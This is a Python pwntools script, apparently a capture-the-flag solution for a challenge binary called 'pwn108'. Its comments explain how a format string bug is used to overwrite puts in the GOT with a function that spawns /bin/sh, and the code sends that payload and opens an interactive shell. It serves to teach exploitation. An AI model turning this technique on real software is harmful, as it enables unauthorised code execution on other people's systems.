#!/usr/bin/python3
from pwn import *

'''
# What will we learn
GOT overwrites

# notable
$ checksec pwn108
    RELRO:    **Partial RELRO**
    Stack:    Canary found
    NX:       NX enabled
    PIE:      **No PIE (0x400000)**

# High level overview
1. pdf @ sym.holidays (radare2) reveals that the function calls /bin/sh
2. buf is called by printf with no formatting, so we have a format string exploit  
3. (local) no "name" input, payload in "No" our input starts @ %10$lX
4. puts is called after printf, so we want to replace GOT puts with the address of sym.holidays

# misc
no aslr
sym.holidays  @ 0x0040123b
buffer starts @ %10$lX
'''

elf = context.binary = ELF('./pwn108', checksec=False)
sym_holidays = int('0x0040123b', 16)

payload = fmtstr_payload(10, {elf.got['puts'] : sym_holidays})

# start process and send blank line for name
p = process()
p.recvuntil(b"name]: ")
p.sendline()

# send payload and spawn interactive session
p.recvuntil(b"No]: ")
p.sendline(payload)
p.interactive()
